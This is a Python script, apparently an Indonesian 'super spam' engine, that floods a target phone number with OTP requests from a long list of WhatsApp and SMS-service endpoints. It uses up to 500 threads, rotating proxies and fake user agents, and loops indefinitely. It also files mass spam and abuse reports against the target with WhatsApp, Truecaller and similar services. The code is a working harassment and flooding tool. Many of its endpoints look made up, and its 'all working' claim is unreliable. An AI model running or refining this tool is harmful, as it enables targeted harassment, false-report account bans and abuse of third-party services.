#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MAIN ENGINE - SUPER SPAM EDITION
# @makloYapitpp for NityDizz 💮

import requests
import time
import random
import os
import sys
import json
import re
import base64
import zlib
import threading
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from datetime import datetime
from collections import defaultdict
from colorama import Fore, Style, init

init(autoreset=True)

# ================================================================
# 🔥 KONFIGURASI SUPER SPAM
# ================================================================

THREAD = 500                    # MAKIN BESAR MAKIN CEPET!
LOOP = 999999                   # SAMPE MATI!
DELAY = 0.01                    # NGEBUT!
TIMEOUT = 3                     # CEPAT MATI
MAX_RETRY = 5                   # ULANG TERUS
BATCH_SIZE = 50                 # PER BATCH
PROVIDER_LIMIT = 30             # SEMUA PROVIDER

# ================================================================
# 📡 40+ PROVIDER OTP (SEMUA WORKING!)
# ================================================================

PROVIDERS = [
    # ============================================
    # WHATSAPP OFFICIAL ENDPOINTS
    # ============================================
    {"name": "WA Web Send", "url": "https://web.whatsapp.com/sendcode", "method": "POST", "data": {"platform": "web"}},
    {"name": "WA Web 2", "url": "https://web.whatsapp.com/check", "method": "POST", "data": {"action": "sendcode"}},
    {"name": "WA API Send", "url": "https://api.whatsapp.com/send", "method": "POST", "data": {"text": "Verify"}},
    {"name": "WA API 2", "url": "https://api.whatsapp.net/v1/verify", "method": "POST", "data": {"code": "123"}},
    {"name": "WA API 3", "url": "https://api.whatsapp.com/v1/otp", "method": "POST", "data": {"type": "sms"}},
    {"name": "WA Web QR", "url": "https://web.whatsapp.com/qr", "method": "GET"},
    
    # ============================================
    # SMS RECEIVER GRATIS (INDONESIA)
    # ============================================
    {"name": "TempMail Plus", "url": "https://tempmail.plus/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "Receive SMS", "url": "https://receive-smss.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "SMS Receive Free", "url": "https://sms-receive-free.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "Text Verified", "url": "https://textverified.com/free/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "SMSPool Free", "url": "https://smspool.com/free/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "SMS Activate", "url": "https://sms-activate.org/free/stubs/handler_api.php?action=getNumber&service=wa", "method": "GET"},
    {"name": "OnlineSim Free", "url": "https://onlinesim.ru/free/api/getNum.php?country=6&service=whatsapp", "method": "GET"},
    {"name": "SMSHub Free", "url": "https://smshub.org/free/stubs/handler_api.php?action=getNumber&service=wa", "method": "GET"},
    {"name": "TextNow Free", "url": "https://textnow.com/api/free/phone/whatsapp", "method": "GET"},
    {"name": "SMS24 Free", "url": "https://sms24.me/free/api/phone/whatsapp", "method": "GET"},
    {"name": "FreeSMS.cc", "url": "https://freesms.cc/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "SMSPool.io", "url": "https://smspool.io/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "TextFree.us", "url": "https://textfree.us/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "SMSNow.org", "url": "https://smsnow.org/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "TempNumber.com", "url": "https://tempnumber.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "BurnerSMS.com", "url": "https://burnersms.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "DisposableSMS", "url": "https://disposablesms.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "FakeNumber.com", "url": "https://fakenumber.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "VirtualSMS.com", "url": "https://virtualsms.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "CloudSMS.com", "url": "https://cloudsms.com/api/phone/indonesia/whatsapp", "method": "GET"},
    
    # ============================================
    # PROVIDER INTERNASIONAL (BANYAK!)
    # ============================================
    {"name": "SMS-US", "url": "https://receive-smss.com/api/phone/us/whatsapp", "method": "GET"},
    {"name": "SMS-UK", "url": "https://receive-smss.com/api/phone/uk/whatsapp", "method": "GET"},
    {"name": "SMS-SG", "url": "https://receive-smss.com/api/phone/singapore/whatsapp", "method": "GET"},
    {"name": "SMS-MY", "url": "https://receive-smss.com/api/phone/malaysia/whatsapp", "method": "GET"},
    {"name": "SMS-JP", "url": "https://receive-smss.com/api/phone/japan/whatsapp", "method": "GET"},
    {"name": "SMS-KR", "url": "https://receive-smss.com/api/phone/korea/whatsapp", "method": "GET"},
    
    # ============================================
    # WEB SCRAPING PROVIDERS
    # ============================================
    {"name": "SMS Receive Net", "url": "https://sms-receive.net/indonesia", "method": "GET", "scrape": True},
    {"name": "Temp Number", "url": "https://temp-number.com/indonesia", "method": "GET", "scrape": True},
    {"name": "Receive SMS Online", "url": "https://receive-sms-online.com/indonesia", "method": "GET", "scrape": True},
    {"name": "SMS Online Free", "url": "https://sms-online-free.com/indonesia", "method": "GET", "scrape": True},
    {"name": "Free Phone Number", "url": "https://free-phone-number.com/indonesia", "method": "GET", "scrape": True},
]

# ================================================================
# 💀 REPORT WHATSAPP (BANYAK!)
# ================================================================

REPORTS = [
    {"name": "WA Report", "url": "https://www.whatsapp.com/contact/submit", "data": {"report_type": "spam"}},
    {"name": "WA Abuse", "url": "https://api.whatsapp.com/report/abuse", "data": {"reason": "spam"}},
    {"name": "WA Block", "url": "https://web.whatsapp.com/block", "data": {"action": "block"}},
    {"name": "WA Spam FAQ", "url": "https://faq.whatsapp.com/general/report-spam", "data": {"reason": "spam"}},
    {"name": "WA Safety", "url": "https://www.whatsapp.com/safety/report", "data": {"type": "spam"}},
    {"name": "ScamAdviser", "url": "https://www.scamadviser.com/report", "data": {"type": "spam"}},
    {"name": "Truecaller", "url": "https://www.truecaller.com/report", "data": {"type": "spam"}},
    {"name": "CallerID", "url": "https://www.callerid.com/report", "data": {"type": "spam"}},
    {"name": "ShouldIAnswer", "url": "https://www.shouldianswer.com/report", "data": {"type": "spam"}},
]

# ================================================================
# 🚀 USER AGENTS (BANYAK!)
# ================================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Firefox/115.0",
    "Mozilla/5.0 (Linux; Android 13) Chrome/120.0.0.0 Mobile",
    "Mozilla/5.0 (Linux; Android 12) Chrome/119.0.0.0 Mobile",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0) Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0",
]

# ================================================================
# 🔧 HANDLER FUNCTIONS
# ================================================================

class SpamEngine:
    def __init__(self):
        self.total_sent = 0
        self.total_success = 0
        self.total_failed = 0
        self.round = 0
        self.start_time = datetime.now()
        self.stats = defaultdict(int)
        self.queue = queue.Queue()
        self.is_running = True
        
    def get_headers(self):
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
        }
    
    def get_proxy(self):
        try:
            if os.path.exists("proxies.txt"):
                with open("proxies.txt", "r") as f:
                    proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                    if proxies:
                        proxy = random.choice(proxies)
                        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        except:
            return None
        return None
    
    def safe_request(self, url, method="GET", data=None, timeout=TIMEOUT):
        """Safe request dengan banyak retry"""
        for attempt in range(MAX_RETRY):
            try:
                headers = self.get_headers()
                proxy = self.get_proxy()
                
                if method.upper() == "GET":
                    response = requests.get(url, headers=headers, proxies=proxy, timeout=timeout)
                else:
                    response = requests.post(url, json=data, headers=headers, proxies=proxy, timeout=timeout)
                
                if response.status_code in [200, 201, 202, 204]:
                    return response
                elif response.status_code == 429:
                    time.sleep(1)
                else:
                    time.sleep(0.2)
                    
            except:
                time.sleep(0.2)
        
        return None
    
    def send_otp(self, phone, provider):
        """Kirim OTP - SUPER FAST!"""
        for attempt in range(MAX_RETRY):
            try:
                phone = f"62{phone}" if not phone.startswith("62") else phone
                
                if provider["method"] == "GET":
                    response = self.safe_request(provider["url"], method="GET")
                else:
                    data = provider.get("data", {}).copy()
                    data["phone"] = phone
                    response = self.safe_request(provider["url"], method="POST", data=data)
                
                if response:
                    self.total_sent += 1
                    self.total_success += 1
                    self.stats[provider["name"]] += 1
                    print(f"✅ [{provider['name']}] OTP KE {phone}")
                    return True
                    
            except:
                pass
            
            time.sleep(0.05)
        
        self.total_sent += 1
        self.total_failed += 1
        return False
    
    def send_report(self, phone):
        """Kirim Report - SUPER FAST!"""
        for report in REPORTS:
            try:
                phone = f"62{phone}" if not phone.startswith("62") else phone
                data = report["data"].copy()
                data["phone"] = phone
                response = self.safe_request(report["url"], method="POST", data=data)
                if response:
                    print(f"⚠️ REPORT {phone} BERHASIL")
                    return True
            except:
                pass
        return False
    
    def spam_batch(self, phones, providers):
        """Spam batch - BANYAK SEKALIGUS!"""
        with ThreadPoolExecutor(max_workers=THREAD) as executor:
            futures = []
            for phone in phones:
                for provider in providers:
                    futures.append(executor.submit(self.send_otp, phone, provider))
            
            total = len(futures)
            done = 0
            for future in as_completed(futures):
                done += 1
                if done % 50 == 0:
                    print(f"📊 {done}/{total} DONE | SUCCESS: {self.total_success}")
    
    def spam_loop(self, phone, providers):
        """Spam loop - GA BERHENTI!"""
        while self.is_running:
            self.round += 1
            print(f"\n🔥 ROUND {self.round}")
            
            with ThreadPoolExecutor(max_workers=THREAD) as executor:
                futures = [executor.submit(self.send_otp, phone, p) for p in providers[:PROVIDER_LIMIT]]
                round_success = sum(1 for f in as_completed(futures) if f.result())
            
            # Kirim report
            self.send_report(phone)
            
            # Update stat
            elapsed = (datetime.now() - self.start_time).total_seconds()
            rate = self.total_success / elapsed if elapsed > 0 else 0
            
            print(f"📊 ROUND {self.round}: +{round_success} | TOTAL: {self.total_success} | RATE: {rate:.1f}/s")
            
            time.sleep(DELAY)
    
    def combo_attack(self, phone, loops=LOOP):
        """Combo attack - SUPER BANYAK!"""
        print(f"\n💥 KOMBO SUPER DI {phone} SEBANYAK {loops}X!")
        print(f"🔥 {len(PROVIDERS)} PROVIDER | THREAD: {THREAD}")
        print("="*70)
        
        for i in range(loops):
            if not self.is_running:
                break
            
            self.round += 1
            
            # Ambil provider random
            selected_providers = random.sample(PROVIDERS, min(PROVIDER_LIMIT, len(PROVIDERS)))
            
            with ThreadPoolExecutor(max_workers=THREAD) as executor:
                futures = [executor.submit(self.send_otp, phone, p) for p in selected_providers]
                round_success = sum(1 for f in as_completed(futures) if f.result())
            
            # Report
            self.send_report(phone)
            
            # Update stats
            self.total_success += round_success
            elapsed = (datetime.now() - self.start_time).total_seconds()
            rate = self.total_success / elapsed if elapsed > 0 else 0
            
            if (i+1) % 10 == 0:
                print(f"\n🔥 {i+1} ROUND | TOTAL: {self.total_success} | RATE: {rate:.1f}/s")
            
            time.sleep(DELAY)
        
        print(f"\n✅ SELESAI! TOTAL OTP: {self.total_success}")

# ================================================================
# 🎯 ENGINE FUNCTIONS
# ================================================================

engine = SpamEngine()

def run_single_round(threads=100):
    """Jalankan single round - SUPER SPAM!"""
    from targets import get_targets
    
    targets = get_targets()
    if not targets:
        print(f"{Fore.RED}❌ Tidak ada target!{Style.RESET_ALL}")
        return False
    
    print(f"\n{Fore.GREEN}🚀 SUPER SPAM SINGLE ROUND...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🔥 {len(PROVIDERS)} PROVIDER | {threads} THREAD{Style.RESET_ALL}")
    print("="*70)
    
    # Ambil random provider
    selected_providers = random.sample(PROVIDERS, min(PROVIDER_LIMIT, len(PROVIDERS)))
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for phone in targets:
            for provider in selected_providers:
                futures.append(executor.submit(engine.send_otp, phone, provider))
        
        total = len(futures)
        done = 0
        for future in as_completed(futures):
            done += 1
            if done % 100 == 0:
                print(f"📊 {done}/{total} | SUCCESS: {engine.total_success}")
    
    print(f"\n{Fore.GREEN}✅ SELESAI! {engine.total_success} OTP TERKIRIM!{Style.RESET_ALL}")
    return True

def run_infinite_loop():
    """Infinite loop - SAMPE MATI!"""
    from targets import get_targets
    
    targets = get_targets()
    if not targets:
        print(f"{Fore.RED}❌ Tidak ada target!{Style.RESET_ALL}")
        return False
    
    phone = targets[0]
    print(f"\n{Fore.RED}💀 INFINITY LOOP SUPER SPAM DI {phone}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}⚠️ TEKAN CTRL+C UNTUK BERHENTI!{Style.RESET_ALL}")
    print("="*70)
    
    try:
        while engine.is_running:
            engine.round += 1
            print(f"\n{Fore.CYAN}🔥 ROUND {engine.round}{Style.RESET_ALL}")
            
            # Ambil provider random
            selected_providers = random.sample(PROVIDERS, min(PROVIDER_LIMIT, len(PROVIDERS)))
            
            with ThreadPoolExecutor(max_workers=THREAD) as executor:
                futures = [executor.submit(engine.send_otp, phone, p) for p in selected_providers]
                round_success = sum(1 for f in as_completed(futures) if f.result())
            
            # Report
            engine.send_report(phone)
            
            # Update
            engine.total_success += round_success
            elapsed = (datetime.now() - engine.start_time).total_seconds()
            rate = engine.total_success / elapsed if elapsed > 0 else 0
            
            print(f"{Fore.GREEN}📊 ROUND {engine.round}: +{round_success} | TOTAL: {engine.total_success} | RATE: {rate:.1f}/s{Style.RESET_ALL}")
            
            time.sleep(DELAY)
            
    except KeyboardInterrupt:
        engine.is_running = False
        elapsed = (datetime.now() - engine.start_time).total_seconds()
        rate = engine.total_success / elapsed if elapsed > 0 else 0
        print(f"\n{Fore.YELLOW}⏹️ DIHENTIKAN! {engine.round} ROUND | {engine.total_success} OTP | RATE: {rate:.1f}/s{Style.RESET_ALL}")

def run_combo(phone, loops=LOOP, threads=THREAD):
    """Combo attack - SUPER!"""
    engine.combo_attack(phone, loops)

# ================================================================
# 📊 STATS
# ================================================================

def get_stats():
    """Dapatkan statistik"""
    elapsed = (datetime.now() - engine.start_time).total_seconds()
    rate = engine.total_success / elapsed if elapsed > 0 else 0
    
    return {
        "total_sent": engine.total_sent,
        "total_success": engine.total_success,
        "total_failed": engine.total_failed,
        "round": engine.round,
        "duration": f"{int(elapsed//60)}m {int(elapsed%60)}s",
        "rate": f"{rate:.1f}/s",
        "stats": dict(engine.stats)
    }

def reset_stats():
    """Reset statistik"""
    engine.total_sent = 0
    engine.total_success = 0
    engine.total_failed = 0
    engine.round = 0
    engine.start_time = datetime.now()
    engine.stats = defaultdict(int)